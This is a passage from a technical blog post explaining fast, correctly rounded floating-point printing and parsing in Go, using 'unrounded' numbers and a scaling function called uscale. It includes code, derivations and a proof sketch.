math.Float64frombits(m)\n\t}\n\treturn math.Float64frombits(m&^(1<<52) | uint64(1075+e)<<52)\n}fpfmt/fpfmt.go:41,49[Other presentations use “fraction” and “significand” instead of “mantissa”.\nThis post uses mantissa for consistency with my 2011 post\nand because I generally agree with Agatha Mallett’s excellent\n“In Defense of ‘Mantissa’”.]Unrounded NumbersFloating-point operations are defined as if computed exactly to infinite precision\nand then rounded to the nearest actual floating-point number,\nbreaking ties by rounding to an even mantissa.\nOf course, real implementations don’t use infinite precision;\nthey only keep enough precision to round properly.\nWe will use the same idea.\nIn our algorithms, we want the scaling operation to eventually evaluate to an integer,\nbut we want to give the caller control over the rounding step.\nSo instead of returning an integer, we will return anunrounded number,\nwhich contains all the information needed to round it in a variety of ways.The unrounded form of any real numberx, which we will write as as⟨x⟩,\nis the truncated integer part ofxfollowed by two more bits.\nThose bits indicate (1) whether the fractional part ofxwas at least ½, and (2) whether the fractional part was not exactly 0 or ½.\nIf you think ofxas a real number written in binary, the first extra bit is the bit immediately after the “binary point”—the bit that represents2−1, aka the ½ bit—and the second extra bit is the OR of all the bits after the ½ bit.This definition applies even to numbers that require an infinite binary representation.\nFor example, just as 1/3 requires an infinite decimal representation ‘0.333...’,\n1.6 requires an infinite binary representation ‘1.1001100110011...’.\nThe unrounded version⟨1.6⟩is finite: ‘1.11’.\nBut instead of reading unrounded numbers in binary,\nlet’s print⟨x⟩as‘n.hs’wherenis the integer part⟨x⟩>>2,his 0 or 5, andsis ‘+’ when the second bit is 1.\nThen⟨1.6⟩is written ‘1.5+’.⟨x⟩=⌊4x⌋|(4x≠⌊4x⌋)⟨6exactly⟩=24=‘6.0’⟨6.000001⟩=25=‘6.0+’⟨6.499999⟩=25=‘6.0+’⟨6.5exactly⟩=26=‘6.5’⟨6.500001⟩=27=‘6.5+’⟨6.999999⟩=27=‘6.5+’⟨7exactly⟩=28=‘7.0’Let’s implement unrounded numbers in Go.type unrounded uint64\n\nfunc unround(x float64) unrounded {\n\treturn unrounded(math.Floor(4*x)) | bool2[unrounded](math.Floor(4*x) != 4*x)\n}\n\nfunc (u unrounded) String() string {\n\treturn fmt.Sprintf(\"⟨%d.%d%s⟩\", u>>2, 5*((u>>1)&1), \"+\"[1-u&1:])\n}fpfmt/fpfmt.go:52,61Thebool2function converts a boolean to an integer.\n(The Go compiler will implement this using an inlined conditional move.)// bool2 converts b to an integer: 1 for true, 0 for false.func bool2[T ~int | ~uint64](b bool) T {\n\tif b {\n\t\treturn 1\n\t}\n\treturn 0\n}fpfmt/fpfmt.go:15,21We won’t use theunroundconstructor in our actual code, but it’s helpful for playing.\nFor example, we can try the examples we just saw:row(\"x\", \"raw\", \"str\")\nfor _, x := range []float64{6, 6.001, 6.499, 6.5, 6.501, 6.999, 7} {\n    u := unround(x)\n    row(x, uint64(u), u)\n}\ntable()x      raw  str\n6      24   ⟨6.0⟩\n6.001  25   ⟨6.0+⟩\n6.499  25   ⟨6.0+⟩\n6.5    26   ⟨6.5⟩\n6.501  27   ⟨6.5+⟩\n6.999  27   ⟨6.5+⟩\n7      28   ⟨7.0⟩The unrounded form⟨x⟩holds the information needed by all the usual rounding operations.\nAdding 0, 1, 2, or 3 and then dividing by four (or shifting right by two) yields: floor, round with ½ rounding down, round with ½ rounding up, and ceiling.\nIn floating-point math, we want to round with ½ rounding to even, meaning 1½ and 2½ both round to 2.\nWe can do that by adding1+odd(x),\nwhereodd(x)is 0 or 1 according to whetherxis odd.\nThat’s just the low bit ofx:odd(x)=(x&1)=(⟨x⟩>>2)&1.Putting that all together:⌊⟨x⟩⌋=(⟨x⟩+0)>>2(floor)[⟨x⟩]−=(⟨x⟩+1)>>2(round,halfdown)[⟨x⟩]even=(⟨x⟩+1+odd(x))>>2(round,halftoeven)=(⟨x⟩+1+((⟨x⟩>>2)&1))>>2[⟨x⟩]+=(⟨x⟩+2)>>2(round,halfup)⌈⟨x⟩⌉=(⟨x⟩+3)>>2(ceiling)In Go:func (u unrounded) floor() uint64         { return uint64((u + 0) >> 2) }\nfunc (u unrounded) roundHalfDown() uint64 { return uint64((u + 1) >> 2) }\nfunc (u unrounded) round() uint64         { return uint64((u + 1 + (u>>2)&1) >> 2) }\nfunc (u unrounded) roundHalfUp() uint64   { return uint64((u + 2) >> 2) }\nfunc (u unrounded) ceil() uint64          { return uint64((u + 3) >> 2) }fpfmt/fpfmt.go:62,66row(\"x\", \"floor\", \"round½↓\", \"round\", \"round½↑\", \"ceil\")\nfor _, x := range []float64{6, 6.25, 6.5, 6.75, 7, 7.5, 8.5} {\n    u := unround(x)\n    row(u, u.floor(), u.roundHalfDown(), u.round(), u.roundHalfUp(), u.ceil())\n}\ntable()x       floor  round½↓  round  round½↑  ceil\n⟨6.0⟩   6      6        6      6        6\n⟨6.0+⟩  6      6        6      6        7\n⟨6.5⟩   6      6        6      7        7\n⟨6.5+⟩  6      7        7      7        7\n⟨7.0⟩   7      7        7      7        7\n⟨7.5⟩   7      7        8      8        8\n⟨8.5⟩   8      8        8      9        9Dividing unrounded numbers preserves correct rounding as long as the second extra bit\nis maintained correctly: once it is set to 1, it has to stay a 1 in all future results.\nThis gives the second extra bit its shorter name: thesticky bit.To divide an unrounded number, we do a normal divide but force the sticky bit to 1\nwhen there is a remainder.\nRight shift does the same.⟨x/n⟩=(⟨x⟩/n)|(⟨x⟩modn≠0)|(⟨x⟩&1)⟨x>>n⟩=(⟨x⟩>>n)|(⟨x⟩mod2n≠0)|(⟨x⟩&1)For example, if we rounded 15.4 to an integer 15 and then divided it by 6,\nwe’d get 2.5, which rounds down to 2,\nbut the more precise answer would be 15.4/6 = 2.57, which rounds up to 3.\nAn unrounded division handles this correctly:⟨15.4⟩=61‘15.0+’“alittlemorethan15”⟨15.4/6⟩=11‘2.5+’“alittlemorethan2½”[⟨15.4/6⟩]=3Let’s implement division and right shift in Go:func (u unrounded) div(d uint64) unrounded {\n\tx := uint64(u)\n\treturn unrounded(x/d) | u&1 | bool2[unrounded](x%d != 0)\n}\n\nfunc (u unrounded) rsh(s int) unrounded {\n\treturn u>>s | u&1 | bool2[unrounded](u&((1<<s)-1) != 0)\n}fpfmt/fpfmt.go:69,76u := unround(15.1).div(6)\nfmt.Println(u, u.round())⟨2.5+⟩ 3Finally, we are going to need to be able to nudge an unrounded number\nup or down before computing a ceiling or floor,\nas if we added or subtracting a tiny amount.\nLet’s add that:func (u unrounded) nudge(δ int) unrounded { return u + unrounded(δ) }fpfmt/fpfmt.go:67row(\"x\", \"nudge(-1).floor\", \"floor\", \"ceil\", \"nudge(+1).ceil\")\nfor _, x := range []float64{15, 15.1, 15.9, 16} {\n    u := unround(x)\n    row(u, u.nudge(-1).floor(), u.floor(), u.ceil(), u.nudge(+1).ceil())\n}x        nudge(-1).floor  floor  ceil  nudge(+1).ceil\n⟨15.0⟩   14               15     15    16\n⟨15.0+⟩  15               15     16    16\n⟨15.5+⟩  15               15     16    16\n⟨16.0⟩   15               16     16    17Floating-point hardware maintains three extra bits to round\nall arithmetic operations correctly.\nFor just division and right shift, we can get by with only two bits.Unrounded ScalingThe fundamental insight of this post is that all\nfloating-point conversions can be written correctly\nand simply usingunrounded scaling,\nwhich multiplies a numberxby a power of two and a power of ten\nand returns the unrounded product.uscale(x,e,p)=⟨x·2e·10p⟩.Whenpis negative, the value10pcannot be stored exactly in any finite binary floating-point number,\nso any implementation of uscale must be careful.In Go, we can implement uscale using big integers and an unrounded division:func uscale(x uint64, e, p int) unrounded {\n    num :=   mul(big(4), big(x), pow(2, max(0, p)),  pow(10, max(0, e)))\n    denom := mul(                pow(2, max(0, -p)), pow(10, max(0, -e)))\n    div, mod := divmod(num, denom)\n    return unrounded(div.uint64() | bool2[uint64](!mod.isZero()))\n}Themaxexpressions choose between multiplying2eintonumwhene>0or multiplying2−eintodenomwhene<0,\nand similarly for10p.\nThedivmodimplements the floor, andmod.isZeroreports\nwhether the floor was exact.This implementation of uscale is correct but inefficient.\nIn our usage,eandpwill mostly cancel out,\ntypically with opposite signs,\nand the inputxand resultuscale(x,e,p),\nwill always fit in 64 bits.\nThat limited input domain and range makes it possible\nto implement a very fast, completely accurate uscale,\nand we’ll see that implementation later.Our actual implementation will be split into two functions,\nto allow sharing some computations derived frompande.\nInstead ofuscale(x, e, p), the fast Go version will be called asuscale(x, prescale(e, p, log2Pow10(p))).\nAlso, callers are responsible for passing in anxleft-shifted to have its\nhigh bit set.\nTheunpackfunction we looked at already arranged that for its result,\nbut otherwise callers need to do something like:shift = 64 - bits.Len64(x)\n... uscale(x<<shift, prescale(e-shift, p, log2Pow10(p))) ...Conceptually, uscale maps numbers on one fixed-point scale to numbers on another,\nincluding converting between binary and decimal scales.\nFor example, consider the scales2−13and10−4:Givenxfrom the2−13side,uscale(x,−13,4)maps to the equivalent\npoint on the10−4side;\nand givenxfrom the10−4,uscale(x,13,−4)maps to the equivalent\npoint on the2−13side.\nBefore we look at the fast implementation ofuscale,\nlet’s look at how it simplifies all the floating-point printing\nand parsing algorithms.Fixed-Width PrintingOur first application of uscale is fixed-width printing.\nGivenf=m·2e, we want to compute its\napproximate equivalentd·10de, wheredhas exactlyndigits.\nIt only takes 17 digits to uniquely identify any float64,\nso we’re willing to limitn≤18,\nwhich will ensuredfits in a uint64.\nThe strategy is to multiplyfby10pfor somepand then round it to an integerd.\nThen the result isd·10−p.Then-digit requirement meansd=m·2e·10p∈[10n−1,10n).\nFrom this we can derivep:m·2e·10p∈[10n−1,10n)m·2e·10p∈10n−1·[1,10)[factoringrange](log10m·2e)+p∈n−1+[0,1)[takinglog]p∈n−1−(log10m·2e)+[0,1)[isolatingp]p∈n−1−((log10m·2e)−[0,1))[regrouping]p=n−1−⌊log10m·2e⌋[pisaninteger]p=n−1−⌊(log102)·(e+log2m)⌋[changinglogbase]It is okay forpto be too big—we will get an extra digit that we can divide away—so\nwe can approximatelog2masbits(m)−1, wherebits(m)is the bit length ofm.\nThat gives usp=n−1−⌊(log102)·(e+bits(m)−1)⌋.\nWith this derivation ofp, uscale does the rest of the work.The floor expression is a simple linear function and can be computed\nexactly for our inputs using fixed-point arithmetic:// log10Pow2(x) returns ⌊log₁₀ 2**x⌋ = ⌊x * log₁₀ 2⌋.func log10Pow2(x int) int {// log₁₀ 2 ≈ 0.30102999566 ≈ 78913 / 2^18return (x * 78913) >> 18\n}fpfmt/fpfmt.go:78,82Thelog2Pow10function, which we mentioned above and need to\nuse when callingprescale, is similar:// log2Pow10(x) returns ⌊log₂ 10**x⌋ = ⌊x * log₂ 10⌋.func log2Pow10(x int) int {// log₂ 10 ≈ 3.32192809489 ≈ 108853 / 2^15return (x * 108853) >> 15\n}fpfmt/fpfmt.go:84,88Now we can put everything together:// FixedWidth returns the n-digit decimal form of f as d * 10**p.// n can be at most 18.func FixedWidth(f float64, n int) (d uint64, p int) {\n\tif n > 18 {\n\t\tpanic(\"too many digits\")\n\t}\n\tm, e := unpack64(f)\n\tp = n - 1 - log10Pow2(e+63)\n\tu := uscale(m, prescale(e, p, log2Pow10(p)))\n\td = u.round()\n\tif d >= uint64pow10[n] {\n\t\td, p = u.div(10).round(), p-1\n\t}\n\treturn d, -p\n}fpfmt/fpfmt.go:96,110That’s the entire conversion!The code splitsfintom,e;\ncomputespas just described;\nand then usesuscaleandroundto computed=f·10p.\nIf the result has an extra digit,\neither because our approximate log madeptoo big,\nor because of rollover during rounding,\nwe divide the unrounded form by 10, round again, and updatep.\nWhen we approximatedlog2mby counting bits,\nwe used the exact log of the greatest power of two less than or equal tom,\nso the computeddmust be less than twice the intended limit10n,\nmeaning the leading digit (if there are too many digits) must be 1.\nAnd rollover only happens for ‘999...’,\nso it is not possible to have both an extra digit and rollover.As an example conversion,\nconsider a float64 approximation ofπ(0x1921fb54442d18·2−51) to 15 decimal digits.\nWe havee=−51,n=15, andbits(m)=53,\nsop=n−1−⌊(log102)·(e+bits(m)−1)⌋=14.The2−51and10−14scales align like this:Thenuscale(0x1921fb54442d18,−51,14)returns the unrounded number ‘314159265358979.0+’,\nwhich rounds to 314159265358979.\nOur answer is then314159265358979·10−14.Parsing DecimalsUnrounded scaling also lets us parse decimal representations of floating-point numbers efficiently.\nLet’s assume we’ve taken care of parsing a string like ‘1.23e45’\nand now have an integer and exponent liked=123,p=45−2=43.\nTo convertd·10pto a float64,\nwe can choose an appropriateeso thatd·2e·10p∈[252,253)and then return[uscale(d,e,p)]·2−e.The derivation ofeis similar to the derivation ofpfor printing:d·2e·10p∈[252,253)d·2e·10p∈252·[1,2)[factoringrange](log2d·10p)+e∈52+[0,1)[takinglog]e∈52−(log2d·10p)+[0,1)[isolatinge]e∈52−((log2d·10p)−[0,1))[regrouping]e=52−⌊log2d·10p⌋[pisaninteger]e=52−⌊(log2d)+(log210)·p⌋[changinglogbase]Once again, it is okay to overestimatee, so we can approximatelog2d=bits(d)−1, yieldinge=53−bits(d)−⌊(log210)·p⌋.\nIfeis very large,−ewill be very small,\nmeaning we will be creating a subnormal,\nso we need to round to a smaller number of bits.\nTo handle this, we capeat 1074,\nwhich caps−eat−1074.\nAs before, due to the approximation oflog2d, the scaled result is at most twice as large as our target,\nmeaning it might have one extra bit to shift away.// Parse rounds d * 10**p to the nearest float64 f.// d can have at most 19 digits.func Parse(d uint64, p int) float64 {\n\tif d > 1e19 {\n\t\tpanic(\"too many digits\")\n\t}\n\tb := bits.Len64(d)\n\te := min(1074, 53-b-log2Pow10(p))\n\tu := uscale(d<<(64-b), prescale(e-(64-b), p, log2Pow10(p)))\n\tm := u.round()\n\tif m >= 1<<53 {\n\t\tm, e = u.rsh(1).round(), e-1\n\t}\n\treturn pack64(m, -e)\n}fpfmt/unopt/fpfmt.go:111,125FixedWidthandParsedemonstrate\nexactly how similar printing and parsing really are.\nIn printing, we are givenm,eand\nfindp; thenuscale(m,e,p)converts binary to decimal.\nIn parsing, we are givend,pand finde;\nthenuscale(d,e,p)converts decimal to binary.We can make parsing a little faster with a few hand optimizations.\nThis optimized version introduceslpto avoid callinglog2Pow10twice,\nand it implements the extra digit handling in branch-free code.// Parse rounds d * 10**p to the nearest float64 f.// d can have at most 19 digits.func Parse(d uint64, p int) float64 {\n\tif d > 1e19 {\n\t\tpanic(\"too many digits\")\n\t}\n\tb := bits.Len64(d)\n\tlp := log2Pow10(p)\n\te := min(1074, 53-b-lp)\n\tu := uscale(d<<(64-b), prescale(e-(64-b), p, lp))// This block is branch-free code for://\tif u.round() >= 1<<53 {//\t\tu = u.rsh(1)//\t\te = e - 1//\t}s := bool2[int](u >= unmin(1<<53))\n\tu = (u >> s) | u&1\n\te = e - s\n\n\treturn pack64(u.round(), -e)\n}// unmin returns the minimum unrounded that rounds to x.func unmin(x uint64) unrounded {\n\treturn unrounded(x<<2 - 2)\n}fpfmt/fpfmt.go:112,138Now we are ready for our next challenge: shortest-width printing.Shortest-Width PrintingShortest-width printing means to prepare a decimal representation\nthat a floating-point parser would convert back to the exact samefloat64,\nusing as few digits as possible.\nWhen there are multiple possible shortest decimal outputs,\nwe insist on the one that is nearest the original input,\nnamely the correctly-rounded one.\nIn general, 17 digits are always enough to uniquely identify afloat64,\nbut sometimes fewer can be used, even down to a single digit in numbers like 1, 2e10, and 3e−42.An obvious approach would be to useFixedPrintfor increasing values ofn,\nstopping whenParse(FixedPrint(f, n)) == f.\nOr maybe we should derive an equation fornand then useFixedPrint(f, n)directly.\nSurprisingly, neither approach works:Short(f)is not necessarilyFixedPrint(f, n)for somen.\nThe simplest demonstration of this isf=289=618970019642690137449562112=0x10000000000000·237,\nwhich looks like this:Becausefis a power of two, the floating-point exponent\nchanges atf,\nas does the spacing between floating-point numbers.\nThe next smallest value is0x1ffffffffffff·2−38,\nmarked on the diagram as0xffffffffffff½·2−37.\nThe dotted lines mark the halfway points betweenfand its nearest floating point neighbors.\nThe accurate decimal answers are those at or between the dotted lines,\nall of which convert back tof.The correct rounding offto 16 digits ends in …901: the next digit infis 3,\nso we should round down.\nHowever, because of the spacing change aroundf,\nthat correct decimal rounding does not convert back tof.\nAFixedPrintloop would choose a 17-digit form instead.\nBut there is an accurate 16-digit form, namely …902.\nThat decimal is closer tofthan it is to any other float64,\nmaking it an accurated.\nAnd since the closer 16-digit value …901 is not an accurated,Shortshould use …902 instead.Assuming as usual thatf=m·2e,\nlet’s definefootprint(f)to be the distance between the midpoints fromfto its\nfloating-point neighbors.\nNormally those neighbors are2ein either direction—the midpoints are(m±½)·2e—sofootprint(f)=2e.\nAt a power of two with an exponent change,\nthe lower midpoint is instead(m−¼)·2e,\nsofootprint(f)=¾·2e.\nThe rounding paradox can only happen for powers of two\nwith this kind of skewed footprint.All that is to say we cannot useFixedWidthwith “the rightn”.\nBut we can use scale directly with “the rightp.”\nSpecifically, we can compute the midpoints betweenfand its floating-point neighbors\nand scale them to obtain the\nminimum and maximum valid choices ford.\nThen we can make the best choice:If one of the validdends in 0, use it after removing trailing zeros.(Choosing the rightpwill allow at most ten consecutive integers,\nso at most will one end in 0.)If there is only one validd, use it.Otherwise there are at least two validd, at least one on each side off;\nuse the correctly rounded one.Here is an example of the first case: one of the validdends in zero.We already saw an example of the second case: only one validd.\nFor numbers with symmetric footprints, that will be the\ncorrectly roundedd.\nAs we saw for numbers with skewed footprints,\nthat may not be the correctly roundedd,\nbut it is still the correct answer.Finally, here is an example of the third case: multiple validd,\nbut none that end in zero.\nNow we should use the correctly rounded one.This sounds great, but how do we determine the rightp?\nWe wantfootprint(f)to allow at least one decimal integer,\nbut at most ten, meaning1≤footprint(f)<10.\nLuckily, we can hit that target exactly.For a symmetric footprint:footprint(f)·10p∈[1,10)2e·10p∈[1,10)[definitionoffootprint(f)]10p∈(1/2e)·[1,10)[isolatingp]p∈−(log102)·e+[0,1)[takinglog]p∈−((log102)·e−[0,1))[regrouping]p=−⌊(log102)·e⌋[pisaninteger]For a skewed footprint:footprint(f)·10p∈[1,10)¾·2e·10p∈[1,10)[definitionoffootprint(f)]10p∈(1/(¾·2e))·[1,10)[isolatingp]p∈−(log10¾+(log102)·e)+[0,1)[takinglog]p∈−(log10¾+(log102)·e−[0,1))[regrouping]p=−⌊log10¾+(log102)·e⌋[pisaninteger]For the symmetric footprint, we can uselog10Pow2,\nbut for the skewed footprint, we need a new approximation:// skewed computes the skewed footprint of m * 2**e,// which is ⌊log₁₀ 3/4 * 2**e⌋ = ⌊e*(log₁₀ 2)-(log₁₀ 4/3)⌋.func skewed(e int) int {\n\treturn (e*631305 - 261663) >> 21\n}fpfmt/fpfmt.go:234,238We should worry about a footprint with decimal width exactly 1,\nsince iffhad an odd mantissa,\nthe midpoints would be excluded.\nIn that case, if the decimals were the exact midpoints,\nthere would be no decimal between them,\nmaking the conversion invalid.\nBut it turns out we should not worry too much.\nFor a skewed footprint,¾·2e·10pcan never be exactly 1,\nbecause nothing can divide away the 3.\nFor a symmetric footprint,2e·10p=1can only happen fore=p=0,\nbut then scaling is a no-op,\nso that the decimal integers are exactly the binary integers.\nThe non-integer midpoints map to non-integer decimals.When we compute the decimal equivalents of the midpoints,\nwe will use ceiling and floor instead of rounding them,\nto make sure the integer results are valid decimal answers.\nIf the mantissamis odd, we will nudge the unrounded forms\ninward slightly before taking the ceiling or floor,\nsince rounding will be away fromm.The Go code is:// Short computes the shortest formatting of f,// using as few digits as possible that will still round trip// back to the original float64.func Short(f float64) (d uint64, p int) {\n\tconst minExp = -1085\n\n\tm, e := unpack64(f)\n\n\tvar min uint64\n\tz := 11// extra zero bits at bottom of m; 11 for 53-bit mif m == 1<<63 && e > minExp {\n\t\tp = -skewed(e + z)\n\t\tmin = m - 1<<(z-2)// min = m - 1/4 * 2**(e+z)} else {\n\t\tif e < minExp {\n\t\t\tz = 11 + (minExp - e)\n\t\t}\n\t\tp = -log10Pow2(e + z)\n\t\tmin = m - 1<<(z-1)// min = m - 1/2 * 2**(e+z)}\n\tmax := m + 1<<(z-1)// max = m + 1/2 * 2**(e+z)odd := int(m>>z) & 1\n\n\tpre := prescale(e, p, log2Pow10(p))\n\tdmin := uscale(min, pre).nudge(+odd).ceil()\n\tdmax := uscale(max, pre).nudge(-odd).floor()\n\n\tif d = dmax / 10; d*10 >= dmin {\n\t\treturn trimZeros(d, -(p - 1))\n\t}\n\tif d = dmin; d < dmax {\n\t\td = uscale(m, pre).round()\n\t}\n\treturn d, -p\n}fpfmt/fpfmt.go:198,232Notice that this algorithm requires either two or three calls touscale.\nWhen the number being printed has only one valid representation\nof the shortest length, we avoid the third call touscale.\nAlso notice that theprescaleresult is shared by all three calls.Whenm=263,min<263,\nmeaning it won’t be left shifted as far as possible\nduring the call touscale.\nAlthough we could detect this case and calluscalewith2·minande−1,\nusingminunmodified is fine:\nit is still shifted enough that the bitsuscaleneeds to return will stay in the high 64 bits of the 192-bit product,\nand using the sameelets us use the sameprescalework for all three calls.Trimming ZerosThetrimZerosfunction used inShortremoves any trailing zeros from its argument,\nupdating the decimal power. An unoptimized version is:// trimZeros removes trailing zeros from x * 10**p.// If x ends in k zeros, trimZeros returns x/10**k, p+k.// It assumes that x ends in at most 16 zeros.func trimZeros(x uint64, p int) (uint64, int) {\n\tif x%10 != 0 {\n\t\treturn x, p\n\t}\n\tx /= 10\n\tp += 1\n\n\tif x%100000000 == 0 {\n\t\tx /= 100000000\n\t\tp += 8\n\t}\n\tif x%10000 == 0 {\n\t\tx /= 10000\n\t\tp += 4\n\t}\n\tif x%100 == 0 {\n\t\tx /= 100\n\t\tp += 2\n\t}\n\tif x%10 == 0 {\n\t\tx /= 10\n\t\tp += 1\n\t}\n\treturn x, p\n}fpfmt/unopt/fpfmt.go:227,254The initial removal of a single zero gives an early return for\nthe common case of having no zeros.\nOtherwise, the code makes four additional checks that\ncollectively remove up to 16 more zeros.\nFor outputs with many zeros, these four checks run faster\nthan a loop removing one zero at a time.When compiling this code,\nthe Go compiler reduces the remainder checks to multiplications\nusing the following well-known optimization.\nAn exactuint64divisionx/cwherexmodc=0can be implemented byx·mwheremis theuint64multiplicative inverse ofc, meaningm·cmod264=1:\nSincecis also the multiplicative inverse ofm,x·mis\nlossless—all the exact multiples ofcmap to all of[0,(264−1)/c]—so\nthe non-multiples are forced to map to larger values.\nThis observation gives a quick test for whetherxis an exact multiple ofc:\ncheck whetherx·m≤(264−1)/c.Only oddchave multiplicative inverses modulo powers of two,\nso even divisors require more work.\nTo compute an exact divisionx/(c<<s),\nwe can use(x/c)>>sinstead.\nTo check for remainder, we need to check that those lowsbits are all zero before we shift them away.\nWe can merge that check with the range check by rotating those bits\ninto the high part instead of discarding them:\ncheck whetherx·m↻>s≤(264−1)/c,\nwhere↻>is right rotate.The Go compiler does this transformation automatically\nfor theifconditions intrimZeros,\nbut inside theifbodies, it does not reuse the\nexact quotient it just computed.\nI considered changing the compiler to recognize that pattern,\nbut instead I wrote out the remainder check by hand\nin the optimized version, allowing me to reuse the computed exact quotients:// trimZeros removes trailing zeros from x * 10**p.// If x ends in k zeros, trimZeros returns x/10**k, p+k.// It assumes that x ends in at most 16 zeros.func trimZeros(x uint64, p int) (uint64, int) {\n\tconst (\n\t\tmaxUint64 = ^uint64(0)\n\t\tinv5p8    = 0xc767074b22e90e21// inverse of 5**8inv5p4    = 0xd288ce703afb7e91// inverse of 5**4inv5p2    = 0x8f5c28f5c28f5c29// inverse of 5**2inv5      = 0xcccccccccccccccd// inverse of 5)// Cut 1 zero, or else return.if d := bits.RotateLeft64(x*inv5, -1); d <= maxUint64/10 {\n\t\tx = d\n\t\tp += 1\n\t} else {\n\t\treturn x, p\n\t}// Cut 8 zeros, then 4, then 2, then 1.if d := bits.RotateLeft64(x*inv5p8, -8); d <= maxUint64/100000000 {\n\t\tx = d\n\t\tp += 8\n\t}\n\tif d := bits.RotateLeft64(x*inv5p4, -4); d <= maxUint64/10000 {\n\t\tx = d\n\t\tp += 4\n\t}\n\tif d := bits.RotateLeft64(x*inv5p2, -2); d <= maxUint64/100 {\n\t\tx = d\n\t\tp += 2\n\t}\n\tif d := bits.RotateLeft64(x*inv5, -1); d <= maxUint64/10 {\n\t\tx = d\n\t\tp += 1\n\t}\n\treturn x, p\n}fpfmt/fpfmt.go:240,278This approach to trimming zeros is from Dragonbox.\nFor more about the general optimization,\nsee Warren’sHacker’s Delight[34],\nsections 10-16 and 10-17.Fast, Accurate ScalingThe conversion algorithms we examined are nice and simple.\nFor them to be fast,uscaleneeds to be fast while remaining correct.\nAlthough multiplication by2ecan be implemented by shifts,uscalecannot actually compute or multiply by10p—that would take too long whenpis a large positive or negative number.\nInstead, we can approximate10pas a floating-point numberpm·2pewith a 128-bit mantissa,\nlooked up in a table indexed byp.\nSpecifically, we will usepe=⌊log210p⌋−127andpm=⌈10p/2pe⌉,\nensuring thatpm∈[2127,2128).\nWe will write a separate program to generate this table.\nIt emits Go code definingpow10Min,pow10Max, andpow10Tab:pow10Tab[0]holds the entry forp=pow10Min.\nTo figure out how big the table needs to be,\nwe can analyze the three functions we just wrote.FixedWidthconverts floating-point to decimal.\nIt needs to calluscalewith a 53-bitx,e∈[−1137,960], andp∈[−307,341].Shortalso converts floating-point to decimal.\nIt needs to calluscalewith a 55-bitx,e∈[−1137,960], andp∈[−292,324].Parseconverts decimal to floating-point.\nIt needs to calluscalewith a 64-bitxandp∈[−343,289].\n(Outside that range ofp,Parsecan return 0 or infinity.)So the table needs to provide answers forp∈[−343,341].If10p≈pm·2pe, thenx·2e·10p≈x·pm·2e+pe.\nIn all of our algorithms, the result ofuscalewas always small—at most 64 bits.\nSincepmis 128 bits andx·pmis even bigger,e+pemust be negative,\nso this computation is(x*pm) >> -(e+pe).\nBecause of the ceiling,pmmay be too large by an errorε0<1,\nsox·pmmay be too large by an errorε1=x·ε0<x.\nTo round exactly, we care whether any of the shifted bits is 1,\nbutε1may change the lowbits(x)bits,\nso we can’t trust them.\nInstead, we will throw them away.\nand use only the upper bits to compute our unrounded number.\nThat is the entire idea!Now let’s look at the implementation.\nTheprescalefunction returns ascalerwithpmand a shift counts:// A scaler holds derived scaling constants for a given e, p pair.type scaler struct {\n\tpm pmHiLo\n\ts  int\n}// A pmHiLo represents hi<<64 + lo.type pmHiLo struct {\n\thi uint64\n\tlo uint64\n}fpfmt/unopt/fpfmt.go:256,266We want the shift count to reserve two extra bits for the unrounded\nrepresentation and to apply to the top 64-bit word of the 192-bit product,\nwhich gives this formula:s=−(e+pe)−2−(192−64)=−(e+⌊log210p⌋−127)−2−128=−(e+⌊log210p⌋+3)That translates directly to Go:// prescale returns the scaling constants for e, p.// lp must be log2Pow10(p).func prescale(e, p, lp int) scaler {\n\treturn scaler{pm: pow10Tab[p-pow10Min], s: -(e + lp + 3)}\n}fpfmt/fpfmt.go:292,296Inuscale, since the caller left-justifiedxto 64 bits,\ndiscarding the lowbits(x)bits means discarding the\nlowest 64 bits of the product, which we skip computing entirely.\nThen we use the middle 64-bit word and the lowsbits\nof the upper word to set the sticky bit in the result.// uscale returns unround(x * 2**e * 10**p).// The caller should pass c = prescale(e, p, log2Pow10(p))// and should have left-justified x so its high bit is set.func uscale(x uint64, c scaler) unrounded {\n\thi, mid := bits.Mul64(x, c.pm.hi)\n\tmid2, _ := bits.Mul64(x, c.pm.lo)\n\tmid, carry := bits.Add64(mid, mid2, 0)\n\thi += carry\n\tsticky := bool2[unrounded](mid != 0 || hi&((1<<c.s)-1) != 0)\n\treturn unrounded(hi>>c.s) | sticky\n}fpfmt/unopt/fpfmt.go:302,312It is mind-boggling that this works, but it does.\nOf course, you shouldn’t take my word for it.\nWe have to prove it correct.Sketch of a Proof of Fast ScalingTo prove that our fastuscalealgorithm is correct,\nthere are three cases: small positivep,\nsmall negativep,\nand largep.\nThe actual proof, especially for largep,\nis non-trivial,\nand the details are quite a detour from\nour fast scaling implementations,\nso this section only sketches the basic ideas.\nFor the details, see the accompanying post, “Fast Unrounded Scaling: Proof by Ivy.”Remember from the previous section thatpm=⌈10p/2pe⌉=10p/2pe+ε0for someε0<1.\nSince10p=5p·2p,pm’s 128 bits need only represent the5ppart; the2pcan always be handled bype.Forp∈[0,27),5pfits in the top 64 bits of the 128-bitpm.\nSincepmis exact,\nthe only possible error is introduced by discarding the bottombits(x)bits.\nSince the bottom 64 bits ofpmare zero,\nthe bits we discard are all zero.\nSouscaleis correct for small positivep.Forp∈[−27,−1],x·pmis approximating division by5−p(remember that−pis a positive number!).\nThe 128-bit approximation is precise enough that whenxis a\nmultiple of5−p, only the lowestbits(x)bits are non-zero;\ndiscarding them keeps the unrounded form exact.\nAnd whenxis not a multiple of5−p,\nthe result has a fractional part that must be at least1/5−paway from an integer.\nThat fractional separation is much larger than the maximum error in the product,\nso the high bits saved in the unrounded form are correct;\nthe fraction is also repeating, so that there is guaranteed\nto be a 1 bit to cause the unrounded form to be marked inexact.\nSouscaleis correct for small negativep.Finally, we must handle largep, which always have a non-zero error\nand therefore should always return unrounded numbers marked inexact\n(with the sticky bit set to 1).\nConsider the effect of adding a small error to the idealized “correct”x·10p/2pe,\nproducingx·pm.\nThe error is at most 64 bits.\nAdding that error to the 192-bit product can certainly affect\nthe low 64 bits, and it may also generate a carry out of the low 64\ninto the middle 64 bits.\nThe carry turns 1 bits into 0 bits from right to left\nuntil it hits a 0 bit;\nthat first 0 bit becomes a 1, and the carry stops.\nThe key insight is that seeing a 1 in the middle bits\nis proof that the carry did not reach the high bits,\nso the high bits are correct.\n(Seeing a 1 in the middle bits also ensures that\nthe unrounded form is marked inexact, as it must be,\neven though we discarded the low bits.)\nUsing a program backed by careful math, we can analyze all thepmin our table,\nshowing that every possiblex·pmhas a 1 in the middle bits.\nSouscaleis correct for largep.Omit Needless MultiplicationsWe have a fast and correctuscale, but we can make it faster\nnow that we understand the importance of carry bits.\nThe idea is to compute the high 64 bits of the product\nand then use it directly 